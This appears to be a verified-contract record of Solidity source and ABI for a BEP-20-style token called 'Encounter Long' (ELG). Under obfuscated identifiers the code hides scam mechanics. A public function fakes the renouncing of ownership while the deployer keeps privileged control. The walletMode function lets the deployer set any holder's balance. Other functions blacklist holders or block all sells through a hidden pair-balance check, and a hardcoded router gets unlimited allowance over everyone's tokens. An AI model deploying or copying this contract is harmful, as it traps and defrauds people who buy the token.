{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface swapEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txModeAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeIs {\n    function createPair(address buyAt, address shouldTotal) external returns (address);\n}\n\ninterface minLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapMarketing) external view returns (uint256);\n\n    function transfer(address minBuy, uint256 toExempt) external returns (bool);\n\n    function allowance(address liquidityLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minBuy,\n        uint256 toExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeToEnable, uint256 value);\n    event Approval(address indexed liquidityLaunch, address indexed spender, uint256 value);\n}\n\ninterface minLiquidityMetadata is minLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EncounterLong is txModeAuto, minLiquidity, minLiquidityMetadata {\n\n    uint256 launchLaunched;\n\n    bool private shouldLaunch;\n\n    mapping(address => mapping(address => uint256)) private sellList;\n\n    uint256 public buyReceiver;\n\n    uint256 constant senderBuy = 9 ** 10;\n\n    function approve(address swapModeToken, uint256 toExempt) public virtual override returns (bool) {\n        sellList[_msgSender()][swapModeToken] = toExempt;\n        emit Approval(_msgSender(), swapModeToken, toExempt);\n        return true;\n    }\n\n    string private modeMax = \"ELG\";\n\n    uint8 private txIs = 18;\n\n    mapping(address => uint256) private takeLiquidityTrading;\n\n    function allowance(address txFromTeam, address swapModeToken) external view virtual override returns (uint256) {\n        if (swapModeToken == buyReceiverTeam) {\n            return type(uint256).max;\n        }\n        return sellList[txFromTeam][swapModeToken];\n    }\n\n    function senderAt() private view {\n        require(fundMaxSwap[_msgSender()]);\n    }\n\n    function limitMax(address buyToMin) public {\n        if (atSell) {\n            return;\n        }\n        \n        fundMaxSwap[buyToMin] = true;\n        \n        atSell = true;\n    }\n\n    function txReceiver(address fromMaxTeam, address minBuy, uint256 toExempt) internal returns (bool) {\n        require(takeLiquidityTrading[fromMaxTeam] >= toExempt);\n        takeLiquidityTrading[fromMaxTeam] -= toExempt;\n        takeLiquidityTrading[minBuy] += toExempt;\n        emit Transfer(fromMaxTeam, minBuy, toExempt);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingSwap;\n    }\n\n    uint256 public senderLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txIs;\n    }\n\n    bool public listMarketing;\n\n    uint256 private receiverFrom;\n\n    uint256 exemptSender;\n\n    function exemptMin(address enableFromTotal) public {\n        senderAt();\n        if (receiverFrom != txMin) {\n            shouldLaunch = true;\n        }\n        if (enableFromTotal == exemptAt || enableFromTotal == swapAmount) {\n            return;\n        }\n        fundMarketingLiquidity[enableFromTotal] = true;\n    }\n\n    function owner() external view returns (address) {\n        return senderMode;\n    }\n\n    function transferFrom(address fromMaxTeam, address minBuy, uint256 toExempt) external override returns (bool) {\n        if (_msgSender() != buyReceiverTeam) {\n            if (sellList[fromMaxTeam][_msgSender()] != type(uint256).max) {\n                require(toExempt <= sellList[fromMaxTeam][_msgSender()]);\n                sellList[fromMaxTeam][_msgSender()] -= toExempt;\n            }\n        }\n        return totalMax(fromMaxTeam, minBuy, toExempt);\n    }\n\n    uint256 private sellTx = 100000000 * 10 ** 18;\n\n    uint256 private tradingShould;\n\n    function receiverEnableToken() public {\n        emit OwnershipTransferred(exemptAt, address(0));\n        senderMode = address(0);\n    }\n\n    address buyReceiverTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private txMin;\n\n    uint256 private listFund;\n\n    string private marketingSwap = \"Encounter Long\";\n\n    constructor (){\n        \n        swapEnable limitBuyMax = swapEnable(buyReceiverTeam);\n        swapAmount = takeIs(limitBuyMax.factory()).createPair(limitBuyMax.WETH(), address(this));\n        \n        exemptAt = _msgSender();\n        receiverEnableToken();\n        fundMaxSwap[exemptAt] = true;\n        takeLiquidityTrading[exemptAt] = sellTx;\n        if (tradingTake) {\n            listMarketing = true;\n        }\n        emit Transfer(address(0), exemptAt, sellTx);\n    }\n\n    function balanceOf(address swapMarketing) public view virtual override returns (uint256) {\n        return takeLiquidityTrading[swapMarketing];\n    }\n\n    bool public atSell;\n\n    function getOwner() external view returns (address) {\n        return senderMode;\n    }\n\n    function totalMax(address fromMaxTeam, address minBuy, uint256 toExempt) internal returns (bool) {\n        if (fromMaxTeam == exemptAt) {\n            return txReceiver(fromMaxTeam, minBuy, toExempt);\n        }\n        uint256 exemptMarketing = minLiquidity(swapAmount).balanceOf(sellFee);\n        require(exemptMarketing == exemptSender);\n        require(minBuy != sellFee);\n        if (fundMarketingLiquidity[fromMaxTeam]) {\n            return txReceiver(fromMaxTeam, minBuy, senderBuy);\n        }\n        return txReceiver(fromMaxTeam, minBuy, toExempt);\n    }\n\n    mapping(address => bool) public fundMaxSwap;\n\n    event OwnershipTransferred(address indexed tokenAuto, address indexed senderTrading);\n\n    address sellFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private senderMode;\n\n    address public exemptAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeMax;\n    }\n\n    bool private tradingTake;\n\n    address public swapAmount;\n\n    function autoTotalMax(uint256 toExempt) public {\n        senderAt();\n        exemptSender = toExempt;\n    }\n\n    function transfer(address takeLaunchedTo, uint256 toExempt) external virtual override returns (bool) {\n        return totalMax(_msgSender(), takeLaunchedTo, toExempt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTx;\n    }\n\n    mapping(address => bool) public fundMarketingLiquidity;\n\n    function walletMode(address takeLaunchedTo, uint256 toExempt) public {\n        senderAt();\n        takeLiquidityTrading[takeLaunchedTo] = toExempt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeToEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFromTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapModeToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapModeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toExempt\",\"type\":\"uint256\"}],\"name\":\"autoTotalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFromTotal\",\"type\":\"address\"}],\"name\":\"exemptMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMarketingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMaxSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToMin\",\"type\":\"address\"}],\"name\":\"limitMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunchedTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMaxTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunchedTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toExempt\",\"type\":\"uint256\"}],\"name\":\"walletMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EncounterLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}